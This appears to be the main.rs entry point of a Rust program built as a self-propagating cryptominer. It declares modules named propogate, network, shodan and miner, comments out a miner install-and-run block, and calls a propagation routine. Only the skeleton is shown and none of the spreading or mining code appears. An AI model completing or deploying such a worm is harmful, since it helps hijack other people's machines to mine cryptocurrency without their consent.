mod propogate;
mod network;
mod shodan;
mod miner;

use miner::Miner;

use env_logger::{Builder, Env};


fn main() -> Result<(), Box<dyn std::error::Error>> {
    Builder::from_env(Env::default().default_filter_or("info")).init();

    /*
    let miner = Miner::new();

    miner.install()?;

    miner.enable_huge_pages();

    miner.run()?;
    */

    propogate::run()
}


